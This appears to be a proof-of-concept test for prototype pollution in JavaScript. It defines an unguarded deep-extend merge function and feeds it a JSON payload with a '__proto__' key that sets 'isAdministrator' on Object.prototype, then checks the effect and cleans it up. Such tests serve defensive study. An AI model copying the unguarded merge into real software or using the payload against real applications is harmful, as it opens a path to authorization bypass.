function representativeLegacyDeepExtend(target, ...sources) {
  for (const source of sources) {
    for (const key of Object.keys(source)) {
      const current = target[key];
      const value = source[key];
      if (value !== null && typeof value === "object") {
        if (current === null || typeof current !== "object") target[key] = {};
        representativeLegacyDeepExtend(target[key], value);
      } else {
        target[key] = value;
      }
    }
  }
  return target;
}

const patch = JSON.parse('{"__proto__":{"isAdministrator":true}}');
try {
  representativeLegacyDeepExtend({}, patch);
  if ({}.isAdministrator !== true) {
    throw new Error("deep-extend did not modify Object.prototype");
  }
  console.log("vulnerable deep-extend modified Object.prototype");
} finally {
  delete Object.prototype.isAdministrator;
}
